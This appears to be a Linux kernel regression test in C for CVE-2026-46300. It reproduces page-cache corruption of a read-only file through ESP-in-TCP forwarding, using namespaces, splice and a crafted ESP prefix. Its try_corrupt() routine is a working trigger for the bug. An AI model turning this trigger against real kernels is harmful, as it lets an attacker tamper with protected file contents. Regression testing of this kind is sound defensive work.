// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
 */

/*\
 * Verify that skb_segment() does not strip the SKBFL_SHARED_FRAG flag
 * from page-cache fragments when splitting GRO-coalesced packets,
 * causing ESP-in-TCP to decrypt in-place and corrupt read-only file
 * data.
 *
 * When file data is spliced into a TCP socket, the kernel references
 * page-cache pages directly in the skb and marks them with
 * SKBFL_SHARED_FRAG. If the packet traverses a forwarding path where
 * GRO coalesces segments on ingress and skb_segment() splits them on
 * egress (because GSO is disabled), skb_segment() incorrectly strips
 * SKBFL_SHARED_FRAG from the child segments. When the receiver has
 * TCP_ULP "espintcp" enabled, the ESP handler decrypts in-place on
 * page-cache pages, corrupting the cached file contents.
 *
 * The test creates three network namespaces connected via veth pairs
 * (sender - middle - receiver), disables GSO/TSO/GRO on the
 * middle-to-receiver link to force skb_segment(), installs an
 * ESP-in-TCP xfrm SA in the receiver, writes known data to a
 * read-only file, splices it into a TCP socket from the sender,
 * enables espintcp ULP on the receiver side, and verifies the page
 * cache was not corrupted.
 *
 * Reproducer based on:
 * https://github.com/v12-security/pocs/tree/main/fragnesia-5db89c99566fc
 */

#define _GNU_SOURCE

#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <net/if.h>

#include "tst_test.h"
#include "tst_net.h"
#include "tst_netdevice.h"
#include "lapi/tcp.h"
#include "lapi/splice.h"
#include "lapi/sched.h"

#define TESTFILE "pagecache_test"
#define DATA_SIZE 4096

#define SPI 0x100
#define TCP_PORT 5556
#define IV_LEN 8
#define ESP_HDR_SIZE 16
#define AES_KEYLEN 16
#define SALT_LEN 4
#define KEYTOTAL (AES_KEYLEN + SALT_LEN)
#define PREFIX_SIZE (2 + ESP_HDR_SIZE)
#define NETMASK 24

#define SENDER_ADDR   0x0a000101 /* 10.0.1.1 */
#define MIDDLE_ADDR1  0x0a000102 /* 10.0.1.2 */
#define MIDDLE_ADDR2  0x0a000201 /* 10.0.2.1 */
#define RECEIVER_ADDR 0x0a000202 /* 10.0.2.2 */

static const uint8_t aead_key[KEYTOTAL] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static uint8_t original[DATA_SIZE];
static int file_fd = -1;
static int srv_fd = -1;
static int middlens = -1;
static int senderns = -1;
static int receiverns = -1;

static void disable_offloads(const char *ifname)
{
	struct ifreq ifr;
	struct ethtool_value val = { .data = 0 };
	int fd;

	fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	ifr.ifr_data = (void *)&val;

	val.cmd = ETHTOOL_SGSO;
	SAFE_IOCTL(fd, SIOCETHTOOL, &ifr);

	val.cmd = ETHTOOL_STSO;
	SAFE_IOCTL(fd, SIOCETHTOOL, &ifr);

	val.cmd = ETHTOOL_SGRO;
	SAFE_IOCTL(fd, SIOCETHTOOL, &ifr);

	SAFE_CLOSE(fd);
}

static void setup(void)
{
	char keyhex[KEYTOTAL * 2 + 3];
	char spihex[16];
	char port_str[8];
	int i, ret;

	tst_setup_netns();
	NETDEV_SET_STATE("lo", 1);

	CREATE_VETH_PAIR("veth_m1", "veth_s");
	CREATE_VETH_PAIR("veth_m2", "veth_r");

	NETDEV_ADD_ADDRESS_INET("veth_m1", htonl(MIDDLE_ADDR1), NETMASK, 0);
	NETDEV_ADD_ADDRESS_INET("veth_m2", htonl(MIDDLE_ADDR2), NETMASK, 0);
	NETDEV_SET_STATE("veth_m1", 1);
	NETDEV_SET_STATE("veth_m2", 1);

	SAFE_FILE_PRINTF("/proc/sys/net/ipv4/ip_forward", "1");
	disable_offloads("veth_m2");

	middlens = SAFE_OPEN("/proc/self/ns/net", O_RDONLY);

	SAFE_UNSHARE(CLONE_NEWNET);
	senderns = SAFE_OPEN("/proc/self/ns/net", O_RDONLY);
	SAFE_SETNS(middlens, CLONE_NEWNET);
	NETDEV_CHANGE_NS_FD("veth_s", senderns);

	SAFE_SETNS(senderns, CLONE_NEWNET);
	NETDEV_SET_STATE("lo", 1);
	NETDEV_ADD_ADDRESS_INET("veth_s", htonl(SENDER_ADDR), NETMASK, 0);
	NETDEV_SET_STATE("veth_s", 1);
	NETDEV_ADD_ROUTE_INET("veth_s", 0, 0, 0, 0, htonl(MIDDLE_ADDR1));
	SAFE_SETNS(middlens, CLONE_NEWNET);

	SAFE_UNSHARE(CLONE_NEWNET);
	receiverns = SAFE_OPEN("/proc/self/ns/net", O_RDONLY);
	SAFE_SETNS(middlens, CLONE_NEWNET);
	NETDEV_CHANGE_NS_FD("veth_r", receiverns);

	SAFE_SETNS(receiverns, CLONE_NEWNET);
	NETDEV_SET_STATE("lo", 1);
	NETDEV_ADD_ADDRESS_INET("veth_r", htonl(RECEIVER_ADDR), NETMASK, 0);
	NETDEV_SET_STATE("veth_r", 1);
	NETDEV_ADD_ROUTE_INET("veth_r", 0, 0, 0, 0, htonl(MIDDLE_ADDR2));

	keyhex[0] = '0';
	keyhex[1] = 'x';
	for (i = 0; i < KEYTOTAL; i++)
		sprintf(keyhex + 2 + i * 2, "%02x", aead_key[i]);

	snprintf(spihex, sizeof(spihex), "0x%08x", SPI);
	snprintf(port_str, sizeof(port_str), "%d", TCP_PORT);

	const char *const xfrm_cmd[] = {
		"ip", "xfrm", "state", "add",
		"src", "10.0.2.2", "dst", "10.0.2.2",
		"proto", "esp", "spi", spihex,
		"encap", "espintcp", port_str, port_str, "0.0.0.0",
		"aead", "rfc4106(gcm(aes))", keyhex, "128",
		"mode", "transport",
		NULL
	};

	ret = tst_cmd(xfrm_cmd, NULL, NULL, TST_CMD_PASS_RETVAL);
	if (ret)
		tst_brk(TCONF, "Failed to install xfrm ESP-in-TCP state");

	SAFE_SETNS(middlens, CLONE_NEWNET);

	for (i = 0; i < DATA_SIZE; i++)
		original[i] = (uint8_t)(i & 0xff);
}

static void try_corrupt(void)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(RECEIVER_ADDR),
		.sin_port = htons(TCP_PORT),
	};
	uint8_t prefix[PREFIX_SIZE];
	uint16_t frame_len;
	uint32_t spi_net, seq_net;
	char ulp[] = "espintcp";
	int acc_fd;
	loff_t off;

	frame_len = htons(PREFIX_SIZE + DATA_SIZE);
	memcpy(prefix, &frame_len, 2);

	spi_net = htonl(SPI);
	memcpy(prefix + 2, &spi_net, 4);

	seq_net = htonl(1);
	memcpy(prefix + 6, &seq_net, 4);

	memset(prefix + 10, 0xcc, IV_LEN);

	SAFE_SETNS(receiverns, CLONE_NEWNET);

	srv_fd = SAFE_SOCKET(AF_INET, SOCK_STREAM, 0);
	SAFE_SETSOCKOPT_INT(srv_fd, SOL_SOCKET, SO_REUSEADDR, 1);
	SAFE_BIND(srv_fd, (struct sockaddr *)&addr, sizeof(addr));
	SAFE_LISTEN(srv_fd, 1);

	if (!SAFE_FORK()) {
		int cli_fd, pipefd[2];

		SAFE_CLOSE(srv_fd);
		SAFE_SETNS(senderns, CLONE_NEWNET);

		cli_fd = SAFE_SOCKET(AF_INET, SOCK_STREAM, 0);
		SAFE_SETSOCKOPT_INT(cli_fd, IPPROTO_TCP, TCP_NODELAY, 1);
		SAFE_CONNECT(cli_fd, (struct sockaddr *)&addr, sizeof(addr));

		SAFE_SEND(1, cli_fd, prefix, sizeof(prefix), 0);
		SAFE_PIPE(pipefd);

		SAFE_POSIX_FADVISE(file_fd, 0, 0, POSIX_FADV_DONTNEED);

		off = 0;
		SAFE_SPLICE(file_fd, &off, pipefd[1], NULL, DATA_SIZE, 0);

		/*
		 * Splice pipe into TCP socket. On the forwarding
		 * path, skb_segment() may strip SKBFL_SHARED_FRAG,
		 * allowing in-place ESP decrypt on page cache pages.
		 * May fail on patched kernels.
		 */
		splice(pipefd[0], NULL, cli_fd, NULL, DATA_SIZE, 0);

		SAFE_CLOSE(pipefd[0]);
		SAFE_CLOSE(pipefd[1]);
		SAFE_CLOSE(cli_fd);

		exit(0);
	}

	acc_fd = SAFE_ACCEPT(srv_fd, NULL, NULL);
	SAFE_CLOSE(srv_fd);

	tst_reap_children();

	SAFE_SETSOCKOPT(acc_fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp));

	/* Let the espintcp strparser process buffered ESP data */
	usleep(30000);

	SAFE_CLOSE(acc_fd);

	SAFE_SETNS(middlens, CLONE_NEWNET);
}

static void run(void)
{
	uint8_t readback[DATA_SIZE];

	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, DATA_SIZE);
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	try_corrupt();
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	SAFE_READ(1, file_fd, readback, sizeof(readback));
	SAFE_CLOSE(file_fd);

	if (memcmp(readback, original, DATA_SIZE) != 0)
		tst_res(TFAIL, "Page cache corrupted via skb_segment ESP-in-TCP forwarding");
	else
		tst_res(TPASS, "Page cache was not corrupted");

	SAFE_UNLINK(TESTFILE);
}

static void cleanup(void)
{
	if (srv_fd != -1)
		SAFE_CLOSE(srv_fd);

	if (file_fd != -1)
		SAFE_CLOSE(file_fd);

	if (receiverns != -1)
		SAFE_CLOSE(receiverns);

	if (senderns != -1)
		SAFE_CLOSE(senderns);

	if (middlens != -1)
		SAFE_CLOSE(middlens);
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.needs_tmpdir = 1,
	.forks_child = 1,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_USER_NS=y",
		"CONFIG_NET_NS=y",
		"CONFIG_VETH",
		"CONFIG_XFRM",
		"CONFIG_INET_ESP",
		"CONFIG_INET_ESPINTCP",
		"CONFIG_CRYPTO_GCM",
		NULL
	},
	.save_restore = (const struct tst_path_val[]) {
		{"/proc/sys/user/max_user_namespaces", "1024", TST_SR_SKIP},
		{}
	},
	.needs_cmds = (struct tst_cmd[]) {
		{.cmd = "ip"},
		{}
	},
	.tags = (const struct tst_tag[]) {
		{"CVE", "2026-46300"},
		{}
	},
};
